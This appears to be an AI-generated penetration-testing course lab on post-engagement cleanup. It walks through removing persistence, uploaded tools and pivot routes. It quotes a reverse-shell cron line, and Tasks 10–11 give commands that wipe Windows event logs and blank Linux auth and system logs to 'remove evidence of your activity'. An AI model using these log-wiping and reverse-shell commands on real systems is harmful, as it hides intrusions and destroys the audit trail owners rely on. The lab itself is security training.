### _Week 09 — Internal Network Exploitation & Lateral Movement_

**Estimated Time:** 90–150 minutes  
**Difficulty:** Advanced  
**Tools:** Meterpreter, Metasploit Framework, Windows & Linux command‑line tools, log clearing utilities, pivot teardown, persistence removal

---

## **⚠️ Ethical Reminder**

This lab teaches **defensive red‑team tradecraft** for cleaning up after authorized penetration tests.  
It is **never** to be used for malicious purposes.  
Everything here assumes you are operating under a legal engagement with explicit permission.

---

## **1. Purpose of This Lab**

This lab teaches you how to **remove evidence of your activity** from compromised internal hosts after completing an authorized engagement.

By the end of this lab, you will be able to:

- Remove persistence mechanisms
- Clear Windows and Linux logs
- Remove Meterpreter artifacts
- Tear down pivot routes and SOCKS proxies
- Remove uploaded tools (winPEAS, linPEAS, exploits, shells)
- Restore system configurations
- Document cleanup steps for reporting

This is the final lab of Week 09 and prepares you for Week 10’s Active Directory exploitation.

---

## **2. Pre‑Lab Requirements**

You must have:

- Completed **Lab 9.6 (Persistence & Maintaining Access)**
- Installed at least one persistence mechanism
- Established pivot routes
- Uploaded enumeration tools (winPEAS, linPEAS, etc.)
- SYSTEM/root access on internal hosts

---

## **3. Lab Tasks**

---

# **Task 1 — Identify All Persistence Mechanisms Installed**

### **Objective**

Create a checklist of persistence mechanisms to remove.

### **Steps**

Review your notes from Lab 9.6:

- Windows services
- Scheduled tasks
- Registry Run keys
- WMI event subscriptions
- Linux SSH keys
- Cron jobs
- systemd services
- PATH hijacking
- Any uploaded binaries or scripts

### **Deliverable**

A list of persistence mechanisms to remove.

---

# **Task 2 — Remove Windows Persistence (Services)**

### **Objective**

Delete malicious services created earlier.

### **Steps**

List services:

```
sc query
```

Delete service:

```
sc delete <service_name>
```

Stop service first if needed:

```
net stop <service_name>
```

### **Deliverable**

A note confirming service removal.

---

# **Task 3 — Remove Windows Scheduled Tasks**

### **Objective**

Delete scheduled tasks created for persistence.

### **Steps**

List tasks:

```
schtasks /query
```

Delete:

```
schtasks /delete /tn "Updater" /f
```

### **Deliverable**

A note confirming scheduled task removal.

---

# **Task 4 — Remove Windows Registry Run Keys**

### **Objective**

Remove startup entries.

### **Steps**

From Meterpreter:

```
reg deleteval -k HKCU\Software\Microsoft\Windows\CurrentVersion\Run -v updater
```

### **Deliverable**

A note confirming registry cleanup.

---

# **Task 5 — Remove WMI Event Subscriptions**

### **Objective**

Remove WMI persistence.

### **Steps**

List subscriptions:

```
wmic /namespace:\\root\subscription PATH __EventFilter get Name
```

Delete:

```
wmic /namespace:\\root\subscription PATH __EventFilter WHERE Name="Updater" DELETE
```

### **Deliverable**

A note confirming WMI cleanup.

---

---

# **Task 6 — Remove Linux SSH Key Persistence**

### **Objective**

Remove your public key from authorized_keys.

### **Steps**

```
nano ~/.ssh/authorized_keys
```

Delete your key.

### **Deliverable**

A note confirming SSH key removal.

---

# **Task 7 — Remove Cron Job Backdoors**

### **Objective**

Delete malicious cron entries.

### **Steps**

```
crontab -e
```

Remove:

```
*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/...'
```

### **Deliverable**

A note confirming cron cleanup.

---

# **Task 8 — Remove systemd Backdoor Services**

### **Objective**

Delete malicious systemd services.

### **Steps**

```
systemctl disable updater
rm /etc/systemd/system/updater.service
systemctl daemon-reload
```

### **Deliverable**

A note confirming systemd cleanup.

---

# **Task 9 — Remove Uploaded Tools and Payloads**

### **Objective**

Delete enumeration tools, exploits, and shells.

### **Steps**

Search for uploaded files:

```
find / -name "winPEAS*" 2>/dev/null
find / -name "linpeas*" 2>/dev/null
find / -name "rev.sh" 2>/dev/null
find / -name "*.exe" -mtime -1
```

Delete them:

```
rm <file>
```

### **Deliverable**

A list of removed files.

---

# **Task 10 — Clear Windows Event Logs**

### **Objective**

Remove traces of your activity.

### **Steps**

From Meterpreter:

```
clearev
```

Or manually:

```
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
```

### **Deliverable**

A note confirming Windows log cleanup.

---

# **Task 11 — Clear Linux Logs**

### **Objective**

Remove traces from Linux hosts.

### **Steps**

```
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > /var/log/messages
```

### **Deliverable**

A note confirming Linux log cleanup.

---

# **Task 12 — Tear Down Pivot Routes**

### **Objective**

Remove all Metasploit routes.

### **Steps**

List routes:

```
route print
```

Delete:

```
route delete 10.10.10.0/24
route delete 10.10.20.0/24
route delete 10.10.30.0/24
```

### **Deliverable**

A screenshot confirming route removal.

---

# **Task 13 — Stop SOCKS Proxy**

### **Objective**

Disable pivoting infrastructure.

### **Steps**

In Metasploit:

```
jobs
kill <job_id>
```

### **Deliverable**

A note confirming SOCKS proxy shutdown.

---

# **Task 14 — Document Cleanup Steps**

### **Objective**

Create a cleanup report for your engagement.

### **Include:**

- Persistence removed
- Logs cleared
- Tools deleted
- Routes removed
- Hosts restored to original state

### **Deliverable**

A cleanup report in your Obsidian vault.

---

## **4. Completion Criteria**

You have completed Lab 9.8 when you can:

- Remove Windows and Linux persistence
- Clear logs on both OS types
- Remove uploaded tools and payloads
- Tear down pivot routes and proxies
- Document cleanup steps
- Restore internal hosts to pre‑engagement state

---

## **5. Next Steps**

When you’re ready, say:

**“Next lab.”**

And I’ll generate **Lab 10.1 — Active Directory Enumeration (BloodHound + Manual)** in the same course style.